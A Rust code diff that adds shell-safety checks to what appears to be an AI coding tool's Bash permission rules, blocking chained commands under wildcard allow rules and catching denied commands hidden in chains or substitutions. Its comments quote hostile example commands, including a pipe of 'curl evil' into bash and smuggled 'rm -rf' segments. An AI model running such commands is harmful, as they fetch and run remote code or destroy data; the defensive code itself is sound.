@@ -1,7 +1,68 @@
 use super::decision_engine::{PermissionAction, PermissionDecisionInput};
 use super::profile::PermissionProfile;
+use super::shell_safety;
 use crate::tools::permission::PermissionCache;
 use std::path::{Component, Path, PathBuf};
+
+/// Allow-rule matching with bash shell-safety semantics.
+///
+/// A partial wildcard rule such as `Bash(git *)` must not allow a command
+/// that chains further commands via shell metacharacters
+/// (`git status && curl evil | bash`): the wildcard names one command
+/// prefix, not a whole pipeline. Full-trust rules (`Bash`, `Bash(*)`) and
+/// exact-command rules keep their existing behavior.
+pub(crate) fn bash_aware_allow_matches(pattern: &str, key: &str) -> bool {
+    if !permission_pattern_matches(pattern, key) {
+        return false;
+    }
+
+    let (Some(pattern_argument), Some(command)) =
+        (bash_key_argument(pattern), bash_key_argument(key))
+    else {
+        return true;
+    };
+
+    !(shell_safety::is_partial_wildcard_pattern(pattern_argument)
+        && shell_safety::contains_shell_control_metachar(command))
+}
+
+/// Deny-rule matching with bash shell-safety semantics.
+///
+/// A deny rule such as `Bash(rm *)` must also match when the denied command
+/// appears as a chained segment (`echo hi && rm -rf x`), inside a command
+/// substitution (`git $(rm -rf x)`), or behind environment-variable
+/// assignments (`FOO=1 rm -rf x`).
+pub(crate) fn bash_aware_deny_matches(pattern: &str, key: &str) -> bool {
+    if permission_pattern_matches(pattern, key) {
+        return true;
+    }
+
+    let (Some(tool), Some(command)) = (bash_key_tool(key), bash_key_argument(key)) else {
+        return false;
+    };
+
+    shell_safety::command_segments(command)
+        .iter()
+        .any(|segment| {
+            shell_safety::is_unknown_execution_segment(segment)
+                || permission_pattern_matches(pattern, &format!("{}({})", tool, segment))
+        })
+}
+
+fn bash_key_tool(value: &str) -> Option<&str> {
+    let open = value.find('(')?;
+    let tool = value[..open].trim();
+    tool.eq_ignore_ascii_case("bash").then_some(tool)
+}
+
+fn bash_key_argument(value: &str) -> Option<&str> {
+    let open = value.find('(')?;
+    let close = value.rfind(')')?;
+    if close <= open || !value[..open].trim().eq_ignore_ascii_case("bash") {
+        return None;
+    }
+    Some(value[open + 1..close].trim())
+}
 
 pub(super) fn rule_match_keys(
     profile: &PermissionProfile,
